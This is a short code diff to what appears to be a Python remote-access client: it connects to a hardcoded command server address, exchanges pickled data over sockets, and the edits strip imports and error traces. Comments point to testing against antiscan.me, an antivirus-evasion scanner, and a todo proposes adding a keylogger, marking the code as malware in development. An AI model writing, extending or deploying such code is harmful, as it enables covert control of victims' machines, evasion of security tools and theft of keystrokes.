@@ -1,14 +1,13 @@
 #use https://antiscan.me
-import datetime, glob, os
+import datetime, os
 import socket, pickle, time, platform, psutil
 import sys, fasteners
-import traceback, subprocess
+import subprocess
 
 home = ('192.168.0.224', 5000)
 conn = None
 conn_open = False
 buf_size = 4096
-dl = '\\'
 
 def get_size(b, s="B"):
     f = 1024
@@ -130,7 +129,6 @@ def run(): #todo add keylogger?
                 if response:
                     send(response)
             except:
-                traceback.print_exc()
                 server_alive = False
                 conn = None
 
